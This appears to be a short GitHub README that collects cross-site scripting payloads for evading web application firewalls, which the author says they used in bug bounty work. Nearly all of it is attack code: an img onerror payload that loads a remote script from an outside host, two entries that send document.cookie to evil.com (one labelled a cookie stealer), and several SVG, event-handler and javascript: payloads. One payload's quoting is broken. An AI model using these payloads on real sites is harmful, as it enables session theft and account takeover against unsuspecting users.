# xss_waf_bypass
Some collection of xss payloads that worked for me to bypass wafs while doing bb

### Payloads

1. **Inject External JavaScript without `<script>` Tag:**
   
```html
<img src=x onerror="var script = document.createElement('script'); script.src = 'https://basedygt.github.io/xss.js'; document.head.appendChild(script);">
```

2. **Data Exfiltration through Image Source (when CSP is disabled):**

```html
<img src="https://evil.com/?data=" + encodeURIComponent(document.cookie)">
```

Vulnerable when

- Absence of Content-Security-Policy header in the response
- Presence of Content-Security-Policy header with a value of `default-src` or `none`

3. **CSS-Based XSS:**

```css
body { background-image: url('javascript:alert("XSS")'); }
```

4. **SVG XSS:**

```html
<svg/onload=alert(document.domain)>
```

5. **Event Handlers to Execute Payload:**

```html
<button onclick="alert('XSS')">Click Me</button>
```

6. **JavaScript Protocol Handler:**
   
```html
<a href="javascript:alert('XSS')">Click Me</a>
```

### Cookie Stealer Example:

```js
// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://evil.com/index.html/?victim_cookie=' + cookie;
window.location.href = url;
```
